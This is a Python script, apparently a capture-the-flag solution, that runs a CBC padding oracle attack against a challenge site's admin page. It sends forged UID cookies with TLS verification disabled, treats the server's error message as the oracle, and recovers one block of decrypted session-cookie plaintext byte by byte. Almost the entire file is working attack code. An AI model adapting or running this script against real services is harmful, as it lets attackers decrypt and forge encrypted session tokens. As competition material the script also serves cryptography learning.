''' 
Resources / References :
http://robertheaton.com/2013/07/29/padding-oracle-attack/
'''

# requests
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
url = 'https://eucalypt-forest.ctfcompetition.com/admin'
headers = {'user-agent': 'my-app/0.0.1',
'Host':'eucalypt-forest.ctfcompetition.com',
'Referer':'https://eucalypt-forest.ctfcompetition.com/qwerty',
'Cookie': 'UID=41ff9c8b9f81de040bb239c3009ca3f22dee19abdb448a7b66eb1b3f74228d8a5c7a9379ca96054e2acb79962673ee3a'
}

def toHex(x) :
	s = hex(x)[2:]
	while len(s) < 2 : s = '0'+s
	return s

def hexArray(x) :
	return [int(x[i:i+2],16) for i in range(0,len(x),2)]

lastReq = ""

def req() :
	global lastReq
	lastReq = requests.get(url, headers=headers , verify=False).text
	return lastReq

# Send payload to server to validate the padding
def validate(byteArr) :
	# parse byte array to sendable
	toSend = ''.join([toHex(x) for x in byteArr])
	headers['Cookie'] = 'UID='+toSend
	r = req()
	lastReq = r
	#print("Try:",headers['Cookie'])
	#print("Get:",r)
	if "Error: Server Error" not in r : return True
	return False

def xor(b1,b2) :
	return [x^y for x,y in zip(b1,b2)]
	
def attack(byteArr,block) :
	# block 0 = 1-16 (unattackable)
	if block == 0 : raise NotImplementedError("GG")
	
	blockBefore = byteArr[(block-1)*16:(block)*16]
	IV = [0]*16 # We will figure this out
	print("Attack process started")
	for i in range(16) : # attack from the back
		
		# blockBefore = [? ? ? ... (ATK) (PAD) (PAD) (PAD)]
		toSend = blockBefore[:15-i]+xor(IV,[i+1]*16)[15-i:]
		#blockBefore = xor(IV,[i+1]*16)
		for j in range(0 if IV[15-i] == 0 else IV[15-i]^(i+1),256) :
			
			toSend[15-i] = j
			#blockBefore[15-i] = j
			# block=1 , BBBB XXXX ....
			payload = byteArr[:(block-1)*16]+toSend+byteArr[(block)*16:(block+1)*16]
			#print(payload)
			print("I Payload",' '.join([(('<'+str(toSend[ind])+'>') if ind==15-i else str(toSend[ind])) for ind in range(16)]))
			
			#print("Test",i,":",j)
			if(validate(payload)) :
				# valid !
				IV[15-i] = j ^ (i+1)
				print("Valid I[%d] = %d" % (15-i,IV[15-i]))
				print(lastReq)
				print(payload)
				break
			#print(lastReq)
	print("Done : IV = ",IV)
	print("Plaintext :",[chr(x) for x in xor(byteArr[(block-1)*16:(block)*16],IV)])

# asdf
inp = hexArray('77d238b8f606dc12dc7bacfcc4be02c447bc5325b13a80c05e39eb7365e3e41642e9d22b479df9ad769937b3a58bb934')
print(inp)
attack(inp,1)
